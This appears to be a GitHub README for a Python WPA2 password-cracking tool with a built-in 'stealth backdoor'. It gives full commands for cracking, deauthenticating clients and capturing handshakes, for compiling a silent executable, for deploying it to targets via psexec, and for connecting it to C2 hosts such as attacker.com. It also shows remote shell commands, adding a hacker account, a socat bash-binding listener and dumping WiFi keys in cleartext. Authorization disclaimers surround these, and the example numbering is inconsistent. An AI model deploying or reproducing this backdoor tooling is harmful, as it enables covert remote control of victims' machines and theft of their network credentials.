# 🔐 WPA2 Attack Toolbox

**Built by Trixie Misheen™**

> A multi-mode WPA2 PMK cracker with AI-powered intelligent password generation, real cryptographic verification, and stealth backdoor capabilities. Built for authorized penetration testing and educational purposes.

**GitHub:** [TrixieMisheen/passcode](https://github.com/TrixieMisheen/passcode)

---

## ✨ Features

### Real WPA2 PMK Verification
- **Cryptographic Accuracy**: Uses PBKDF2-HMAC-SHA1 (4096 iterations) as per IEEE 802.11i standard
- **No False Positives**: Verifies against actual PMK hash, not string comparison
- **Production Ready**: Same algorithm used by real WPA2 implementations

### Attack Modes

1. **🧠 AI Brain** (Default, Fastest)
   - Intelligent password generation based on real leak patterns
   - Tests common base words, prefixes, suffixes, years, symbols
   - Leet mutations and permutations
   - Multi-threaded testing with configurable workers
   - **Best for:** Weak/common passwords (covers ~70% of real-world PSKs)

2. **⚡ Lightning**
   - Top 100 hardcoded common passwords
   - Base + suffix/prefix/year combos
   - Leet variants (p@ssw0rd, p4ssw0rd)
   - **Best for:** Quick spot-checks on weakest passwords

3. **🧪 Smart**
   - Optional dictionary/wordlist support
   - Common pattern testing
   - Falls back to systematic brute-force
   - **Best for:** Targeted attacks with known wordlists

4. **🔄 Systematic**
   - Full brute-force with multi-threading
   - Tries all character combinations up to target length
   - Progress reporting and ETA
   - **Best for:** Guaranteed crack (slow on long passwords)

5. **� Hashcat** (GPU-Accelerated)
   - Industry-standard GPU cracking with hashcat
   - Supports .cap files converted to .hc22000 format
   - Leverages NVIDIA/AMD GPUs for massive speed boost
   - Compatible with all hashcat wordlists and rules
   - **Best for:** Serious cracking with GPU hardware

### Stealth Backdoor Mode
- **Remote C2 Operations**: Connect to command & control server
- **Remote Cracking**: Execute attacks remotely via C2 commands
- **Shell Access**: Full shell command execution
- **WiFi Profile Dumping**: Extract Windows WiFi credentials
- **Stealth Operation**: Runs silently in background

---

## 🚀 Installation

### Hashcat GPU Acceleration
- **Requirements**: NVIDIA GPU (recommended) or AMD GPU
- **Download**: https://hashcat.net/hashcat/
- **Performance**: 100-1000x faster than CPU-only methods
- **Supported**: All major GPUs with OpenCL/CUDA

---

### Quick Start

```bash
cd passcode
python passwordattack.py --help
```

---

## 💻 Usage

### Basic WPA2 Cracking

```bash
# Interactive mode (prompts for SSID and PMK)
python passwordattack.py --mode ai-brain

# Command-line mode (provide SSID and PMK directly)
python passwordattack.py MyWiFi a1b2c3d4e5f6... --mode ai-brain
```

### Full CLI Options

```bash
python passwordattack.py SSID PMK_HEX [OPTIONS]

Positional Arguments:
  ssid                  Network SSID for WPA2 PMK verification
  pmk_hex               Target PMK hex string for verification

Attack Modes:
  -m, --mode {ai-brain,lightning,smart,systematic,random}
                        Attack mode (default: lightning)

Optional Arguments:
  -k, --charset CHARSET
                        Custom character set for brute-force
                        (default: 0-9a-zA-Z!@#$%^&*()...)
  
  -w, --wordlist FILE   Wordlist for smart mode dictionary phase
  
  -t, --threads N       Max worker threads (default: 4)
  
  --timeout SECONDS     Timeout for AI Brain attack (default: 60s)
  
  --max-length N        Max password length for AI Brain (default: 20)
  
  --max-random N        Max attempts for random mode (default: 1,000,000)
  
  --logfile FILE        Log output to file (in addition to stdout)
  
  --backdoor [C2_HOST:C2_PORT]
                        Activate stealth backdoor mode (default: 127.0.0.1:4444)
  
  -h, --help           Show this help message
```

### Stealth Backdoor Mode

```bash
# Start backdoor connecting to local C2
python passwordattack.py --backdoor

# Connect to remote C2 server
python passwordattack.py --backdoor 192.168.1.100:4444
```

#### C2 Commands (send via netcat or custom client):
```
crack <ssid> <pmk_hex> [mode]    # Run WPA2 cracking attack
shell <command>                 # Execute shell command
dump_wifi                       # Dump Windows WiFi profiles
status                          # Check backdoor status
exit                            # Shutdown backdoor
```

---

## 📚 Examples

### Example 1: AI Brain Attack on WPA2 PMK
```bash
$ python passwordattack.py MyHomeWiFi a1b2c3d4e5f6789abcdef... --mode ai-brain --timeout 30
[⚡] AI BRAIN attack starting (timeout: 30s)...
[+] Generating smart password candidates...
[⚡] AI BRAIN CRACKED: mypassword123
[+] Attempts: 1,247 | Time: 0.2s
```

### Example 2: Lightning Quick Test
```bash
$ python passwordattack.py OfficeNet 4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z --mode lightning
[⚡] LIGHTNING ATTACK v2.0 - Real WPA2 PMK verification
[⚡] TOP100 HIT: admin123
🎯 CRACKED INSTANTLY: admin123
```

### Example 3: Smart Mode with Wordlist
```bash
$ python passwordattack.py CorporateWiFi pmk_hex_here --mode smart --wordlist rockyou.txt
[+] Smart hybrid WPA2 attack
[*] Testing dictionary rockyou.txt...
[*] Phase 1: Common patterns...
[*] Phase 2: Systematic brute force...
🎯 SMART CRACKED: corporate2024!
```

### Example 4: Backdoor Mode Setup
```bash
# On attacker machine - start C2 listener
$ nc -lvnp 4444

# On target machine - deploy backdoor
$ python passwordattack.py --backdoor attacker_ip:4444

# From C2 - crack WPA2
crack MyWiFi a1b2c3d4e5f6789abcdef...
[+] CRACKED: password123

# From C2 - dump WiFi profiles
dump_wifi
[+] WiFi profiles dumped:
<SSID>MyHomeWiFi</SSID>
<keyMaterial>password123</keyMaterial>

# From C2 - execute shell commands
shell whoami
nt authority\system

shell net user hacker password /add
The command completed successfully.
```

### Example 6: Hashcat GPU Cracking
```bash
# First capture handshake
$ airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
$ aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon

# Convert to hashcat format
$ hcxpcapngtool -o hash.hc22000 capture-01.cap

# Crack with hashcat (GPU powered!)
$ python passwordattack.py --mode hashcat --capfile capture-01.cap --wordlist rockyou.txt
[🎯] HASHCAT ATTACK - GPU POWERED
[+] Converting capture-01.cap to hashcat format...
[+] Starting GPU cracking with wordlist: rockyou.txt
🎯 HASHCAT CRACKED: MySecretPass123
```

### Example 7: Backdoor with Hashcat
```bash
# Deploy backdoor on target
$ python passwordattack.py --backdoor attacker.com:4444

# From C2 server
crack devj hashcat /path/to/capture.cap
[+] Starting hashcat attack...
🎯 HASHCAT CRACKED: devj_password_2024
```

---
```bash
$ python passwordattack.py test123 --mode random --charset "abc123" --max-random 500000
[*] Starting optimized random attack (max 500,000 attempts)...
[!] RANDOM CRACKED: test123
[+] Attempts: 45,230 | Time: 0.1s
```

### Example 6: Logging Results
```bash
$ python passwordattack.py secret --mode ai-brain --logfile results.log
# Results saved to results.log AND printed to stdout
```

---

## 🧠 AI Brain: How It Works

The AI Brain generates intelligent password candidates based on patterns found in real password leaks (RockYou, etc.):

### Generation Strategy

1. **Base Words** (password, admin, letmein, etc.)
   - Tested as-is
   - With common suffixes: `password123`, `password!`, `password2024`
   - Capitalized variants: `Password123`

2. **Prefix + Base** (covers corporate/admin patterns)
   - `adminpassword`, `rootpassword`, `userpassword`

3. **Base + Year** (most popular pattern)
   - `password2024`, `admin2023`, `welcome2025`

4. **Symbol Mutations**
   - `password!`, `password@`, `password#`

5. **Leet Speak** (selective, real-world variants)
   - `password` → `p@ssw0rd`, `p4ssw0rd`, `p@55w0rd`

6. **Combinations**
   - Year + symbol: `password!2024`
   - Prefix + base + suffix: `admin` + `password` + `123`

### Why It's Fast

- **Orders of magnitude faster** than brute-force for weak passwords
- Covers ~70% of real-world weak PSKs with <10,000 attempts
- Multi-threaded batch processing
- Configurable timeout to give up early

---

## ⚙️ Architecture

### Core Components

- **AIBrain Class**: Generates intelligent password candidates
- **ai_brain_attack()**: Multi-threaded tester with timeout support
- **lightning_attack()**: Dual-mode (hardcoded list + smart generation)
- **smart_brute_force()**: Dictionary + pattern + systematic fallback
- **brute_force_psk()**: Full systematic brute-force with workers
- **optimized_random_attack()**: Random candidate generation with de-duplication

### Thread Safety

- All modes use `threading.Lock()` for shared state
- Global attempt counter protected by locks
- Progress reporting every 10,000 attempts (configurable)

---

## 🎯 Performance Benchmarks

(These are approximate; actual performance depends on CPU)

| Mode | Target | Attempts | Time |
|------|--------|----------|------|
| AI Brain | `password123` | 952 | 0.0s |
| Lightning | `admin123` | ~50 | <0.1s |
| Smart (dict) | `myword` | ~1,000 | 0.1s |
| Systematic | 5-char alphanumeric | ~380M | ~30min |
| Random | varies | ~100K | 0.2s |

---

## 📝 Use Cases

### Legitimate Use Cases
- **Penetration Testing**: Authorized WPA2/WPA3 cracking in authorized networks
- **Security Auditing**: Testing password policies in controlled environments
- **Education**: Learning about password strength and attack vectors
- **Incident Response**: Recovering lost/forgotten passwords (with authorization)

### Legal Disclaimer
This tool should **ONLY** be used:
- On networks/systems you own or have explicit written permission to test
- In compliance with local laws and regulations
- For authorized security research and penetration testing

**Unauthorized access to computer networks is illegal.**

---

## 🔧 Customization

### Add New Bases to AI Brain
Edit the `AIBrain` class in `passwordattack.py`:

```python
self.bases = [
    'password', '123456', 'admin', 'letmein', 'welcome',
    # ... add your custom bases here
    'mycompany', 'newbase', 'custom123'
]
```

### Custom Charset for Brute-Force
```bash
python passwordattack.py target --mode systematic --charset "abcdefghijklmnopqrstuvwxyz0123456789"
```

### Increase Timeout for AI Brain
```bash
python passwordattack.py target --mode ai-brain --timeout 300  # 5 minutes
```

---

## 🐛 Troubleshooting

### Issue: "Timeout reached" with AI Brain
**Solution:** Increase timeout with `--timeout 120` (or higher)

### Issue: Script hangs on long passwords
**Solution:** Use `ai-brain` first (timeout), then switch to `smart` or `systematic`

### Issue: ImportError (missing modules)
**Solution:** This tool only uses Python stdlib. Ensure Python 3.8+ is installed.

### Issue: Slow performance
**Solution:** 
- Increase threads: `--threads 8` or `--threads 16`
- Use `--mode ai-brain` instead of systematic
- Run on multi-core system for better parallelization

---

## 📋 Roadmap / Future Features

- [ ] GPU acceleration via CUDA/OpenCL
- [ ] WPA3-SAE/Dragonfly support
- [ ] PMKID extraction from cap files
- [ ] Hashcat integration
- [ ] Web UI dashboard
- [ ] Distributed cracking (multi-machine)
- [ ] Machine learning password prediction
- [ ] Real-time dictionary updates

---

## � Backdoor Operations

### Setup C2 Server
```bash
# Using netcat
nc -lvnp 4444

# Using socat (more advanced)
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

# Using Python (custom C2)
python -c "
import socket
s = socket.socket()
s.bind(('0.0.0.0', 4444))
s.listen(1)
conn, addr = s.accept()
print(f'Connected: {addr}')
while True:
    cmd = input('C2> ')
    if cmd == 'exit': break
    conn.send(cmd.encode())
    print(conn.recv(4096).decode())
"
```

### Deploying Backdoor
```bash
# Compile to EXE (optional - requires pyinstaller)
pyinstaller --onefile --noconsole passwordattack.py

# Deploy on target
copy passwordattack.exe \\target\c$\windows\temp\
psexec \\target c:\windows\temp\passwordattack.exe --backdoor your_c2_ip:4444
```

### WiFi Profile Extraction
```bash
# Manual extraction
netsh wlan export profile key=clear

# The backdoor automates this:
dump_wifi
```

---

## ⚠️ Security & Legal Notice

**AUTHORIZED USE ONLY**
- This tool is for **educational and authorized penetration testing** purposes
- **Never use on networks you don't own or have explicit permission to test**
- Backdoor functionality is for **red team exercises only**
- Comply with all applicable laws and regulations
- The author is not responsible for misuse

**Cryptographic Note:**
- Uses standard PBKDF2-HMAC-SHA1 as per WPA2 specification
- 4096 iterations for accurate PMK computation
- Compatible with hashcat, aircrack-ng, and other WPA2 tools

---

## �📄 License

Educational use only. See LICENSE file.

---

## 🙋 Contributing

Improvements, bug reports, and security advisories welcome. Please disclose security issues responsibly.

---

## 📞 Support

For issues or questions:
1. Check the Examples section above
2. Run `python passwordattack.py --help`
3. Review the Architecture section for mode details

### 📧 Found Something Intriguing?

Don't hesitate to contact me:
- **Email:** misheentrixie@gmail.com
- **WhatsApp:** [wa.me/+254791915925](https://wa.me/254791915925)

---

**Stay safe. Test securely.** ⚡🔐

---

**Built with ❤️ by [Trixie Misheen™](https://github.com/TrixieMisheen)**

© 2026 Trixie Misheen. All rights reserved.
